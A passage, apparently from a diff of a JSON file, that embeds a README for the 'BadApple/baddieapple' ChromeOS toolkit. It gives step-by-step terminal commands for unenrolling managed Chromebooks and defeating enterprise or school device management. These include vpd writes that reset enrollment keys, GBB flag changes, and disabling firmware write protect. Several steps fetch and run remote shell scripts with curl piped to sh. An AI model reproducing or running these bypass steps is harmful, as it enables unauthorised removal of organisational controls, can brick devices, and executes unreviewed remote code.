check either. Funnily enough, they mentioned doing it, but didn't think about recovery image modification (see comment #4 of the orginal BadApple report)\n\nQuicksilver\nQuicksilver was found by emerwyi To unenroll on 142 and below, run the following:\n\nvpd -i RW_VPD -s re_enrollment_key=\"$(openssl rand -hex 32)\"\nRecovery Selector\nTo recover to ANY version via miniOS (with wifi) connect to a wifi network, and run this in the terminal\n\ncurl -LO https://ba.crosbreaker.com/recovery_selector.sh && sh recovery_selector.sh {versiontorecoverto}\ndaub\nTo use daub while in BadApple or baddieapple, connect to a wifi network, and run this in the terminal\n\ncurl -LO https://ba.crosbreaker.com/daub.sh && sh daub.sh\nbr0ker\nTo unenroll your device (remove fwmp) while in baddieapple, first make sure you're on kernver 5, connect to a wifi network, and run this in the terminal. This will not work on kernver 6.\n\ncurl -LO https://ba.crosbreaker.com/br0ker.sh && sh br0ker.sh\nUnkeyroll\nNOTE: Write protect must already be disabled for this to work.\n\nTo unkeyroll while in BadApple or baddieapple, connect to a wifi network, and run this in the terminal\n\ncurl -LO https://ba.crosbreaker.com/unkeyroll.sh && sh unkeyroll.sh\nmrchromebox script\nRun the mrchromebox script in baddieapple:\n\ncurl -LO https://ba.crosbreaker.com/mrchromebox.sh && sh mrchromebox.sh\nPencil Sharpener\nThis section has modified steps for Pencil Shapener in a miniOS shell (BadApple)\n\nENSURE YOUR DEVICE IS BELOW v136, IF IT IS ABOVE YOU WILL LIKELY BRICK\nFollow the orginal steps, until you get to the section asking to use sh1mmer to unenroll, once this section is reached open your miniOS shell (see instructions) and enter the following commands:\ncrossystem block_devmode=0\nvpd -i RW_VPD -s check_enrollment=0 -s block_devmode=0\nflashrom --wp-disable\nfutility gbb -s --flash --flags=0x80b3\nflashrom --wp-enable\nAlternatively, you can use the Unkeyroll section at the same point, then booting a shim to do the rest of the work.\n\nPrebuilts?\nnightly.link\n\nlarge releases (fastest)\n\nCredits\nHarryTarryJarry - Making this repo, and most scripts. Also miniOS daub, miniOS Pencil Sharpener, miniOS br0ker, and the miniOS unkeyrolling script.\nfast218 - Thinking of the orginal idea\napplefritter - Finding the orginal BadApple, creating appleboot (making this much more useful.) Also finding this independently and not fedding it.\nBinBashBanana - Helping us with the original POC\ncodenerd87 - Finding this independently and not fedding it, miniOS extractor.\nxz8f - emotional support\nFanqyxl - emotional support (fanqyxl mind disease)",
+      "warning": "",
+      "options": [],
       "isEnd": true
     }
   }
